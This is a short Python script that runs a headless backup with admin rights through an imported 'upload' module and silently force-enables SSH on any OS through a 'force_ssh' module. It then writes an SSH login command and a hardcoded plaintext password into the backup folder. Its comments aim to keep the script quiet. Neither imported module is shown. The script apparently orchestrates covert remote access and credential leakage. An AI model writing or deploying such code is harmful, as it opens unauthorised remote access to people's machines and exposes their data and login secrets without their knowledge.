import os
import socket

import upload
import force_ssh

def save_ssh_info(backup_folder, username="myuser", password="mysecret123", port=22):
    """
    Creates a subfolder 'ssh_info' inside the backup_folder and
    writes a file with SSH connection details plus the password.
    """
    if not backup_folder:
        return

    ssh_info_dir = os.path.join(backup_folder, "ssh_info")
    os.makedirs(ssh_info_dir, exist_ok=True)

    hostname = socket.gethostname()  # or an IP if you'd prefer
    ssh_cmd = f"ssh {username}@{hostname} -p {port}"
    info_file = os.path.join(ssh_info_dir, "connection_info.txt")

    # Write out the SSH command and password
    with open(info_file, "w") as f:
        f.write(f"SSH Command: {ssh_cmd}\n")
        f.write(f"Password: {password}\n")

    # No print, to keep it silent; or minimal:
    # print(f"[INFO] Created SSH info in: {info_file}")

def perform_backup_and_ssh():
    """
    1) Runs the headless backup script to return a backup folder path.
    2) Enables SSH in a headless way (if admin).
    3) If backup succeeded, store an SSH info file inside it.
    """

    # (1) Perform the backup
    backup_folder = upload.run_backup_as_admin_headless()
    if backup_folder is None:
        # Not admin or something else failed -> we quietly stop or handle it
        return False

    # (2) Enable SSH
    ssh_ok = force_ssh.enable_ssh_all_os_headless()

    # (3) Save SSH connection info
    save_ssh_info(backup_folder)

    return True

# Optional main entry point, if you want to run it directly.
if __name__ == "__main__":
    perform_backup_and_ssh()
